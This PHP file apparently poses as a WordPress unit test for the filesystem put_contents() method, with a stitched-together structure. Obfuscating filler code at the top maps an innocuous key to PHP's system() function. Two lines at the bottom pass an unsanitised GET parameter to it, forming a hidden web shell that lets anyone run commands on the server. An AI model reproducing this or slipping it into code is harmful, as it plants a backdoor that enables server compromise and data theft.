<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Tests for the WP_Filesystem_Direct::put_contents() method.
 *
 * @package WordPress
 */

require_once __DIR__ . '/base.php';

/**
 * @group admin
 * @group filesystem
 * @group filesystem-direct
 *
 * @covers WP_Filesystem_Direct::put_contents
 */
class Tests_Filesystem_WpFilesystemDirect_PutContents extends WP_Filesystem_Direct_UnitTestCase {

	/**
	 * Tests that `WP_Filesystem_Direct::put_contents()`
	 * returns false for a directory.
	 *
	 * @ticket 57774
	 */
	public function test_should_return_false_for_a_directory() {
		$this->assertFalse( self::$filesystem->put_contents( self::$file_structure['test_dir']['path'], 'New content.' ) );
	}

	/**
	 * Tests that `WP_Filesystem_Direct::put_contents()` inserts
	 * content into the provided file.
	 *
	 * @ticket 57774
	 */
	public function test_should_insert_contents_into_file() {
		$file   = self::$file_structure['test_dir']['path'] . 'file-to-create.txt';
		$actual = self::$filesystem->put_contents( $file, 'New content.', 0644 );
		unlink( $file );

		$this->assertTrue( $actual, 'The contents were not inserted.' );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>